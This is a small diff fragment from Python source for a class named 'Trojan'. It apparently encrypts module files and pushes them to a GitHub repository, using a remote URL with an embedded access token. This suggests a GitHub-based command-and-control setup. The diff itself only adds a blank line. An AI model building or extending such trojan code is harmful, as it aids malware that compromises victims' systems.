@@ -68,6 +68,7 @@ class Trojan:
                 if module_file.endswith(".py"):
                     module_path = os.path.join(self.local_dir, module_file)
                     self.encrypt_module(module_path)
+
             repo.git.commit("-m", "update trojan")
             origin = repo.remote("origin")
             origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}.git")
